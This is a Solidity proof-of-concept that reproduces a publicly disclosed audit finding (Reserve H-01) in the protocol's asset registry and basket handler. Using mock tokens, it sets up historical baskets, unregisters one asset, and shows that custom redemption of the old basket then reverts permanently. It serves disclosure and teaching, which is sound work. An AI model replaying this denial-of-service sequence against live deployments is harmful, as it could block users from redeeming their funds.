// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Real-source reproduction of Reserve H-01 (Code4rena 2023-06, commit c4ec2473) for the
// in-browser EVM Playground. No cheatcodes: the Exploit contract deploys the REAL
// AssetRegistryP1 and the REAL (vulnerable) BasketHandlerP1, drives the real governance
// path, then shows that custom redemption of a historical basket is permanently bricked
// once one of its assets is unregistered.
import "../src/reserve/target/p1/AssetRegistry.sol";
import "../src/reserve/target/p1/BasketHandler.sol";
import "../src/reserve/target/p1/mixins/BasketLib.sol";
import "../src/reserve/target/interfaces/IMain.sol";
import "../src/reserve/target/interfaces/IAsset.sol";
import "../src/reserve/target/poc/PoCEnv.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Exploit {
    AssetRegistryP1 public assetRegistry;
    BasketHandlerP1 public basketHandler;
    PoCMain public main;
    PoCBackingManager public backingManager;

    MiniERC20 public usdc;
    MiniERC20 public usdt;
    MiniERC20 public dai;
    MiniCollateral public collUSDC;
    MiniCollateral public collUSDT;
    MiniCollateral public collDAI;

    uint256 public assetsReturnedBefore;
    bool public redemptionBricked;
    bool public proven;

    bytes32 internal constant USD = bytes32("USD");
    // Must match foundry.toml `libraries` link for BasketLibP1.
    address internal constant BASKET_LIB = 0x8a6A5771513Da286B191417a57BAeb151F5D3320;

    constructor() {
        // BasketHandlerP1 is linked to BasketLibP1 at a fixed address. Deploy the real
        // library there via CREATE2 (salt 0) so the delegatecalls resolve. This lands at
        // exactly BASKET_LIB because the deployer is this Exploit (attacker nonce 0).
        bytes memory libCode = type(BasketLibP1).creationCode;
        address lib;
        assembly {
            lib := create2(0, add(libCode, 0x20), mload(libCode), 0)
        }
        require(lib == BASKET_LIB, "BasketLibP1 address mismatch");

        main = new PoCMain();
        backingManager = new PoCBackingManager();

        usdc = new MiniERC20("USD Coin", "USDC", 6);
        usdt = new MiniERC20("Tether", "USDT", 6);
        dai = new MiniERC20("Dai", "DAI", 18);
        collUSDC = new MiniCollateral(usdc, USD);
        collUSDT = new MiniCollateral(usdt, USD);
        collDAI = new MiniCollateral(dai, USD);

        // Deploy the REAL upgradeable components behind proxies with empty init data,
        // wire Main, then call init() manually (breaks the component init cycle exactly
        // as the production Deployer does).
        AssetRegistryP1 arImpl = new AssetRegistryP1();
        assetRegistry = AssetRegistryP1(address(new ERC1967Proxy(address(arImpl), "")));

        BasketHandlerP1 bhImpl = new BasketHandlerP1();
        basketHandler = BasketHandlerP1(address(new ERC1967Proxy(address(bhImpl), "")));

        main.setComponents(
            IAssetRegistry(address(assetRegistry)),
            IBackingManager(address(backingManager)),
            IBasketHandler(address(basketHandler)),
            IERC20(address(0xDEAD01)),
            IRToken(address(0xDEAD02)),
            IStRSR(address(0xDEAD03))
        );

        IAsset[] memory assets = new IAsset[](3);
        assets[0] = IAsset(address(collUSDC));
        assets[1] = IAsset(address(collUSDT));
        assets[2] = IAsset(address(collDAI));
        assetRegistry.init(IMain(address(main)), assets);
        basketHandler.init(IMain(address(main)), 60);

        // Governance records the initial 3-asset prime basket (0.9 USDC, 0.05 USDT, 0.05 DAI).
        IERC20[] memory e3 = new IERC20[](3);
        e3[0] = IERC20(address(usdc));
        e3[1] = IERC20(address(usdt));
        e3[2] = IERC20(address(dai));
        uint192[] memory w3 = new uint192[](3);
        w3[0] = 0.9e18;
        w3[1] = 0.05e18;
        w3[2] = 0.05e18;
        basketHandler.setPrimeBasket(e3, w3);
        basketHandler.refreshBasket(); // nonce 1 = {USDC, USDT, DAI}

        // Governance switches the prime basket to 2 assets (0.9 DAI, 0.1 USDC).
        IERC20[] memory e2 = new IERC20[](2);
        e2[0] = IERC20(address(dai));
        e2[1] = IERC20(address(usdc));
        uint192[] memory w2 = new uint192[](2);
        w2[0] = 0.9e18;
        w2[1] = 0.1e18;
        basketHandler.setPrimeBasket(e2, w2);
        basketHandler.refreshBasket(); // nonce 2 = {DAI, USDC}
    }

    function _nonces() internal pure returns (uint48[] memory n) {
        n = new uint48[](1);
        n[0] = 1; // the historical 3-asset basket
    }

    function _portions() internal pure returns (uint192[] memory p) {
        p = new uint192[](1);
        p[0] = 1e18;
    }

    function run() external {
        // (1) A user can redeem the historical basket while all three assets are registered.
        (address[] memory before, ) = basketHandler.quoteCustomRedemption(_nonces(), _portions(), 1e18);
        assetsReturnedBefore = before.length; // == 3
        require(assetsReturnedBefore == 3, "precondition: custom redemption works");

        // (2) Governance unregisters an old asset (USDT). The REAL AssetRegistry.size()
        //     drops from 3 to 2 while basketHistory[1] still holds 3 erc20s.
        assetRegistry.unregister(IAsset(address(collUSDT)));

        // (3) Harm: the SAME legitimate redemption request now reverts. quoteCustomRedemption
        //     sizes erc20sAll from registry.size()=2 but writes index 2 -> index-out-of-bounds.
        bool reverted;
        try basketHandler.quoteCustomRedemption(_nonces(), _portions(), 1e18) returns (
            address[] memory,
            uint256[] memory
        ) {
            reverted = false;
        } catch {
            reverted = true;
        }
        redemptionBricked = reverted;

        proven = (assetsReturnedBefore == 3) && redemptionBricked;
        require(proven, "DoS not demonstrated");
    }
}
